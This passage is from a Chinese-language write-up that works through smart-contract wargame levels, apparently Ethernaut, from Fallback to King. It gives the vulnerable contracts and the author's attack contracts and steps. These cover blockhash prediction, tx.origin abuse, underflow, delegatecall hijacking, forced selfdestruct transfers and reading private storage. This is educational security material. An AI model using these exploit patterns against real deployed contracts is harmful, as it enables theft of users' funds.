<p>由于单次贡献的额度被限制到了0.001ETH 以下，所以不可能通过第一种方式成为 owner（要贡献100万次捏）。那么试一下第二种方式：</p>
<p>首先我们把合约跑起来，可以看到 owner 有很高的初始贡献值：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308090302300.png"
                      alt="image-20230809030209945"
                ></p>
<p>现在我们更换用户，贡献一下看看：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308090306707.png"
                      alt="image-20230809030601235"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308090306959.png"
                      alt="image-20230809030613402"
                ></p>
<p>奇怪，贡献了很多次，但是贡献值还是0。</p>
<p>去看了看 Remix 的使用，在调用函数时设置好发送的金额即可。（我真傻，真的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092105719.png"
                      alt="image-20230809210513962"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092105679.png"
                      alt="image-20230809210526529"
                ></p>
<p>我们把自己的贡献值加到2000，这就满足<code>receive()</code>函数里面成为 owner 其中一个条件了。</p>
<p>关于<code>receive()</code>，当合约接收ETH的时候它会被触发。条件有两个，一是<code>msg.data</code>为空，二是<code>receive()</code>存在。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071410829.png"
                      alt="image-20230907141005773"
                ></p>
<p>Remix IDE有个可以向合约发送 CALLDATA 的功能，设置金额后把 CALLDATA 留空然后发送即可，这样就能顺利触发<code>receive()</code>函数。满足成为 owner 的条件，owner 成功变更：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092155107.png"
                      alt="image-20230809215512188"
                ></p>
<p>下一步把合约的余额清空，调用提现用的<code>withdraw()</code>函数即可：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092156103.png"
                      alt="image-20230809215635248"
                ></p>
<p>Balance 处已经变为0了。</p>
<p>接下来在线上环境打一遍，难点在对于<code>web3-eth</code>包中<code>sendTransaction()</code>函数的<a class="link"   target="_blank" rel="noopener" href="https://learnblockchain.cn/docs/web3.js/web3-eth.html#sendtransaction" >使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，还有就是不依赖 Remix 对合约的函数进行调用，一般以太坊交易包含四个字段，分别是 to、from、amout、data ，其中函数调用信息封装在 data 字段中（<code>sendTransaction()</code>中形参叫做 value）。</p>
<p>data 字段的数据是对函数签名字符串进行 keccak256 哈希运算之后，取前四个字节。contribute()attack()</p>
<p>先看看调用 contribute 的操作（图丢了，假装有个图吧。应该有个 data 字段，值为 0xd7bb99ba）：</p>
<p>然后是 receive：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092311131.png"
                      alt="image-20230809231110635"
                ></p>
<p>随后再进行 withdraw 的调用即可过关：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092329572.png"
                      alt="image-20230809232951547"
                ></p>
<p>这里需要注意，对于没有用 payable 修饰的方法，其 amout(value) 只能为0</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092329101.png"
                      alt="image-20230809232920062"
                ></p>
<p>满足过关条件了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308092331871.png"
                      alt="image-20230809233126836"
                ></p>
<h2 id="02-Fal1out"><a href="#02-Fal1out" class="headerlink" title="02 Fal1out"></a>02 Fal1out</h2><p>看关卡名字估计是<del>整型溢出</del>吧，源码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256; // 应用附加库SafeMath到uint256类型</span><br><span class="line">    mapping(address =&gt; uint256) allocations; // 创建一个地址-&gt;整形的映射</span><br><span class="line">    address payable public owner; // owner的地址变量</span><br><span class="line"></span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        // 合约的构造函数</span><br><span class="line">        owner = msg.sender; // 初始化owner</span><br><span class="line">        allocations[owner] = msg.value; // allocation分配额的意思</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        // 判断是否为owner的函数修改器</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        // 充值用的函数，会调用SafeMath库里面的add()函数</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value); // 将发送的ETH增加到对应的分配额中</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        // 若分配额&gt;0，则将分配额的ETH转给allocator</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocationys() public onlyOwner &#123;</span><br><span class="line">        // 将合约余额全部转给owner</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        // 查询allocator的分配额余额</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>题目要求是成为该合约的 owner，猜测是 SafeMath 库中的<code>add()</code>函数有漏洞（bushi）。</p>
<p>add()：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    require(c &gt;= a, &quot;SafeMath: addition overflow&quot;);</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这函数看着也没啥问题啊。。直接试着调用一下构造函数：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308121825627.png"
                      alt="image-20230812182550567"
                ></p>
<p>这里的构造函数可以直接调用的原因是，在这个（0.6.x）大版本中构造函数是一个名称与合约名相同的函数，而没有使用关键字等标识修饰。题目中<code>Fal1out()</code>函数与合约名不同，因此不被认为是构造函数，导致该函数被直接调用。</p>
<p>看一眼 owner，好家伙，直接变成我了：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308121826811.png"
                      alt="image-20230812182637789"
                ></p>
<p>过关。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202308121827656.png"
                      alt="image-20230812182713614"
                ></p>
<h2 id="03-Coin-Flip"><a href="#03-Coin-Flip" class="headerlink" title="03 Coin Flip"></a>03 Coin Flip</h2><p>本题代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins; // 连胜数</span><br><span class="line">    uint256 lastHash; // 用于储存上个区块的哈希值</span><br><span class="line">    uint256 FACTOR =</span><br><span class="line">        57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">     //115792089237316195423570985008687907853269984665640564039457584007913129639935</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0; // 连胜数</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1)); // 上一区块哈希</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            // 将上一区块的哈希值与储存的上一个哈希进行比较</span><br><span class="line">            revert(); // 若相等，回滚</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue; // 将本区块哈希储存</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            // 猜对</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 猜错</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>目标是连续猜对结果10次</p>
<p>看样子和随机数的安全性有关，可以自己部署一个镜像合约来进行硬币结果的预测：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract H4cker &#123;</span><br><span class="line">    CoinFlip public myCoinFlip;</span><br><span class="line">    uint256 FACTOR =</span><br><span class="line">        57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor(address _adress) public &#123;</span><br><span class="line">        myCoinFlip = CoinFlip(_adress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        myCoinFlip.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里利用自己构造的攻击脚本去调用目标合约的 flip 函数，经过攻击合约的预测，重复执行10次 hack 函数即可。</p>
<h2 id="04-Telephone"><a href="#04-Telephone" class="headerlink" title="04 Telephone"></a>04 Telephone</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>目标是成为该合约的 owner，但是调用 changeOwner 函数这笔交易的发起者不能是当前的消息发送者。</p>
<p>先想到通过构造攻击合约去调用 changeOwner ，因为交易发起者 tx.origin 是调用链最开始的调用者，而 msg.sender 是当前调用的消息发送者。</p>
<p>攻击合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract Hacker &#123;</span><br><span class="line">    Telephone public myTelephone;</span><br><span class="line"></span><br><span class="line">    constructor(address _address) &#123;</span><br><span class="line">        myTelephone = Telephone(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        myTelephone.changeOwner(0x42285Fb92421db39b7EddB9E245f4B092bb0e411);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>欧了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309061646160.png"
                      alt="image-20230906164615093"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309061647466.png"
                      alt="image-20230906164727414"
                ></p>
<h2 id="05-Token"><a href="#05-Token" class="headerlink" title="05 Token"></a>05 Token</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>根据提示，应该是溢出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071205880.png"
                      alt="image-20230907120509823"
                ></p>
<p>题目初始会给予20代币，那就试试看下溢出，即向一个账户转出21代币</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071220732.png"
                      alt="image-20230907122033703"
                ></p>
<p>挺多，应该是2^256^-1</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071222831.png"
                      alt="image-20230907122210795"
                ></p>
<h2 id="06-Delegation"><a href="#06-Delegation" class="headerlink" title="06 Delegation"></a>06 Delegation</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里的 fallback() 没有用 payable 修饰，所以转账额度只能是0。</p>
<p>这里的难点是理解并利用 delegatecall() 函数，这是一种特殊类型的消息调用，被称为<strong>委托调用</strong>。它和一般的消息调用的区别在于，目标地址的代码将在发起调用的合约的上下文中执行，并且 msg.sender 和 msg.value 不变。例如这题中就是利用委托调用来调用另一个合约中的函数。</p>
<p>那就试试看调用 pwn() 函数吧，直接在前端控制台 sendTransaction：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071441474.png"
                      alt="image-20230907144125428"
                ></p>
<p>欧了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="C:\Users\13246\AppData\Roaming\Typora\typora-user-images\image-20230907143851572.png"
                      alt="image-20230907143851572"
                ></p>
<h2 id="07-Force"><a href="#07-Force" class="headerlink" title="07 Force"></a>07 Force</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure></div>

<p>竟然是猫猫？（惊</p>
<p>目标是使合约的余额大于0，但看起来并没有能接收代币的函数在。</p>
<p>在寻找没有 payable 修饰的方法的情况下如何向该合约转账时，看到了官方文档的一些信息：</p>
<blockquote>
<p>一个没有 payable fallback 函数的合约，可以作为 coinbase transaction （又名 miner block reward ）的接收者或者作为 <code>selfdestruct</code> 的目标来接收以太币。</p>
</blockquote>
<p>看了一下，利用 selfdestruct 是比较实际的，selfdestruct 可以强制向合约转账。</p>
<p>攻击合约如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">contract Hacker &#123;</span><br><span class="line">    Force force;</span><br><span class="line"></span><br><span class="line">    constructor(address _address) &#123;</span><br><span class="line">        force = Force(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fucntion hack() public &#123;</span><br><span class="line">        address payable addr = payable(address(force));</span><br><span class="line">        selfdestruct(addr);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>欧了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071550611.png"
                      alt="image-20230907155019552"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309071550282.png"
                      alt="image-20230907155049231"
                ></p>
<h2 id="08-Vault"><a href="#08-Vault" class="headerlink" title="08 Vault"></a>08 Vault</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>目标是让 locked 为 false，这里应该是要读取 private 的 password。</p>
<p>插槽 slot 是 Solidity 中合约的状态变量存储的地方，一个插槽有32字节的空间，存储的规则是从第一个状态变量开始逐项连续存储，第一个状态变量存储在 slot0 中，如果插槽剩余空间可以存下下一个状态变量，那么就在当前插槽继续存储，否则存储到下一插槽。很显然题目中的 bytes32 要放在 slot1 中了。</p>
<p>用 Web3.py 连接 Sepolia，然后读一下插槽。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309082340847.png"
                      alt="image-20230908234018791"
                ></p>
<p>拿到了 password</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202309081451828.png"
                      alt="image-20230908145153648"
                ></p>
<h2 id="09-King"><a href="#09-King" class="headerlink" title="09 King"></a>09 King</h2><p>代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    payable(king).transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这题有点复杂，简单来说就像拍卖，谁价高谁是 king，但是当前出价会给到被推翻的 king。此外，当提交实例时，关卡将收回王权，要绕过这个东西。</p>
<p>看了一下，初始的出价为 0.001ETH 拿到 king 是没问题的，问题在于提交时的操作，绕过那个王权收回，没啥头绪。最后收回的操作应该是通过 owner 调用 receive() 实现的，收回后出价会变回0。</p>
<p>那么我们只需要在合约转账给被推翻的 king 时拒收，就可以阻止王权的收回了。</p>
<p>为此，我们需要一个攻击合约，普通的账户并不能拒收转账。</p>
